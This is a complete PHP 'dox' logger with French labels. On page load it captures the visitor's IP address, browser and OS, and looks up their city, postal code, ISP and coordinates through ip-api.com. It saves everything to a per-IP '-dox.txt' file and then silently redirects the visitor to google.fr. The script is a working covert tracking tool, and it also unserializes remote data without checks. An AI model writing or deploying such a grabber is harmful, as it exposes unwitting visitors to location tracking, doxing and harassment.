<?php
$ip = htmlentities($_SERVER['REMOTE_ADDR'], ENT_QUOTES);
$user_agent =  htmlentities($_SERVER['HTTP_USER_AGENT'], ENT_QUOTES);
$date = date('d/m/Y à H:i:s');

if(preg_match('/Linux/i',$user_agent)) $os = 'Linux';
elseif(preg_match('/Mac/i',$user_agent)) $os = 'Mac'; 
elseif(preg_match('/iPhone/i',$user_agent)) $os = 'iPhone'; 
elseif(preg_match('/iPad/i',$user_agent)) $os = 'iPad'; 
elseif(preg_match('/Droid/i',$user_agent)) $os = 'Android'; 
elseif(preg_match('/Unix/i',$user_agent)) $os = 'Unix'; 
elseif(preg_match('/Windows/i',$user_agent)) $os = 'Windows';
else $os = 'Système inconnu...';

if(preg_match('/Firefox/i',$user_agent)) $navigateur = 'Firefox'; 
elseif(preg_match('/Mac/i',$user_agent)) $navigateur = 'Mac';
elseif(preg_match('/Chrome/i',$user_agent)) $navigateur = 'Chrome'; 
elseif(preg_match('/Opera/i',$user_agent)) $navigateur = 'Opera'; 
elseif(preg_match('/MSIE/i',$user_agent)) $navigateur = 'Internet Explorer'; 
else $navigateur = 'Navigateur inconnu...';

$query = @unserialize(file_get_contents('http://ip-api.com/php/'. $ip)); 

if($query && $query['status'] == 'success') 
{   
    $pays =  htmlentities($query['country'], ENT_QUOTES);
    $timezone = htmlentities($query['timezone'], ENT_QUOTES);
    $region = htmlentities($query['regionName'], ENT_QUOTES);
    $ville = htmlentities($query['city'], ENT_QUOTES);
    $code_postal = htmlentities($query['zip'], ENT_QUOTES);
    $organisation = htmlentities($query['isp'], ENT_QUOTES);
    $latitude =  htmlentities($query['lat'], ENT_QUOTES);
    $longitude =  htmlentities($query['lon'], ENT_QUOTES);
        
    $data = "
    IP : " . $ip . "\r
    Navigateur : " . $navigateur . "\r
    Système : " . $os . "\r
    Pays : " . $pays . "\r
    Timezone : " . $timezone . "\r
    Région : " . $region . "\r
    Ville : " . $ville . "\r
    Code postal : " . $code_postal . "\r
    Fournisseur : " . $organisation . "\r
    Latitude : " . $latitude . "\r
    Longitude : " . $longitude . "\r
    Date : " . $date;
    
    $dox = fopen("logs/" . $ip . "-dox.txt", "w+");
    fputs($dox, $data);
    fclose($dox);
	
    header('Location: https://www.google.fr/');
}
?>
